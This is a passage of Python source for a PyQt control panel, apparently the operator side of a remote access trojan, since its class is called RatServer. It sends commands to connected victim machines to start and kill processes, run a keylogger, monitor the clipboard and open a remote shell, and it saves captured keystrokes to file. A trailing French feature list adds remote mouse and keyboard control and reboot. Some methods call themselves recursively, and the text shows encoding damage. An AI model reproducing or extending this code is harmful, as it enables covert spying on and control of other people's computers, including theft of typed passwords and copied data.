            pid = int(self.process_table.item(selected[0].row(), 0).text())
            self.send_command(self.selected_client, {
                'type': 'command',
                'command': 'kill_process',
                'pid': pid
            })

    def start_process(self):
        if not self.selected_client:
            return
            
        cmd, ok = QInputDialog.getText(
            self,
            "Start Process",
            "Enter the command to run:"
        )
        
        if ok and cmd:
            self.send_command(self.selected_client, {
                'type': 'command',
                'command': 'start_process',
                'cmd': cmd
            })

    def update_process_list(self, addr, processes):
        if addr != self.selected_client:
            return
            
        self.process_table.setRowCount(len(processes))
        for i, proc in enumerate(processes):
            self.process_table.setItem(i, 0, QTableWidgetItem(str(proc['pid'])))
            self.process_table.setItem(i, 1, QTableWidgetItem(proc['name']))
            self.process_table.setItem(i, 2, QTableWidgetItem(f"{proc['cpu']:.1f}%"))
            self.process_table.setItem(i, 3, QTableWidgetItem(f"{proc['memory']:.1f}%"))
            self.process_table.setItem(i, 4, QTableWidgetItem(proc['status']))

    def start_keylogger(self):
        if self.selected_client:
            self.send_command(self.selected_client, {
                'type': 'command',
                'command': 'start_keylogger'
            })

    def stop_keylogger(self):
        if self.selected_client:
            self.send_command(self.selected_client, {
                'type': 'command',
                'command': 'stop_keylogger'
            })

    def clear_keylog(self):
        self.keylog_text.clear()

    def save_keylog(self):
        if not self.keylog_text.toPlainText():
            return
            
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Save Keylog",
            "",
            "Text Files (*.txt)"
        )
        
        if file_path:
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(self.keylog_text.toPlainText())
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to save keylog: {e}")

    def start_clipboard_monitor(self):
        if self.selected_client:
            self.send_command(self.selected_client, {
                'type': 'command',
                'command': 'start_clipboard_monitor'
            })

    def stop_clipboard_monitor(self):
        if self.selected_client:
            self.send_command(self.selected_client, {
                'type': 'command',
                'command': 'stop_clipboard_monitor'
            })

    def clear_clipboard(self):
        self.clipboard_text.clear()

    def update_keylog(self, addr, key):
        if addr == self.selected_client:
            cursor = self.keylog_text.textCursor()
            cursor.movePosition(cursor.MoveOperation.End)
            cursor.insertText(key)

    def update_clipboard(self, addr, content):
        if addr == self.selected_client:
            self.clipboard_text.append(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {content}\n")

    def start_shell(self):
        if self.selected_client:
            self.start_shell(self.selected_client)
            self.shell_output.clear()
            self.shell_output.append("Shell started. Enter commands below.\n")
            
    def stop_shell(self):
        if self.selected_client:
            self.stop_shell(self.selected_client)
            self.shell_output.append("\nShell stopped.")
            
    def send_shell_command(self):
        if self.selected_client and self.shell_command.text():
            command = self.shell_command.text()
            self.shell_output.append(f"\n$ {command}")
            self.send_shell_command(self.selected_client, command)
            self.shell_command.clear()
            
    def update_shell_output(self, addr, data):
        if addr == self.selected_client:
            self.shell_output.append(data)

    def update_client_info(self, address, info):
        """Met √† jour les informations du client dans la liste des clients."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str not in self.clients:
            self.clients[addr_str] = {
                'socket': None,  # Le socket sera mis √† jour plus tard
                'hostname': info.get('hostname', 'Unknown'),
                'os': info.get('os', 'Unknown'),
                'cpu': info.get('cpu', 0.0),
                'memory': info.get('memory', 0.0),
                'status': 'Connected'
            }
        else:
            self.clients[addr_str].update({
                'hostname': info.get('hostname', self.clients[addr_str]['hostname']),
                'os': info.get('os', self.clients[addr_str]['os']),
                'cpu': info.get('cpu', self.clients[addr_str]['cpu']),
                'memory': info.get('memory', self.clients[addr_str]['memory']),
                'status': 'Connected'
            })

    def remove_client(self, address):
        """Supprime un client de la liste des clients."""
        addr_str = f"{address[0]}:{address[1]}"
        if addr_str in self.clients:
            print(f"Client {addr_str} disconnected")
            if addr_str in self.clients:
                del self.clients[addr_str]
            if addr_str in self.current_paths:
                del self.current_paths[addr_str]
            if addr_str == self.selected_client:
                self.selected_client = None
                self.path_edit.clear()
                self.files_table.setRowCount(0)
                self.file_content.clear()
                self.keylog_text.clear()
                self.clipboard_text.clear()
                self.shell_output.clear()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    server = RatServer()
    server.show()
    sys.exit(app.exec()) 



    Fonctionnalit√©s de Contr√¥le :
Contr√¥le de la souris √† distance (d√©placement, clics)
Simulation de touches clavier
Red√©marrage/Arr√™t du syst√®me
Verrouillage/D√©verrouillage de l'√©cran
√ßa 